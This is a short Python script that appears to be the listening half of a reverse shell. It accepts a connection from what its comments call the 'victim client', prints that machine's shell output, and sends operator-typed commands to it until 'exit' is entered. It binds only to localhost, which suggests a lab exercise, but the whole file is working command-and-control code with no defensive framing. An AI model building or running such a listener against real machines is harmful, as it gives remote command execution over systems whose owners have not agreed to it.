from socket import *
import time

# Setup server to issue commands
sock = socket(AF_INET, SOCK_STREAM)
sock.bind(('localhost', 64001))

# Accept victim client connection
sock.listen(1)
victim, addr = sock.accept()

command = ''

# Run forever until the 'exit' command is issued
while command != 'exit':
  time.sleep(0.5)

  # Read any output from victim shell
  output = victim.recv(2048)
  print(output.decode(), end='', flush=True)

  # Issue command from user input
  command = input()
  victim.send((command + '\n').encode())

# Cleanup resources
victim.close()
sock.close()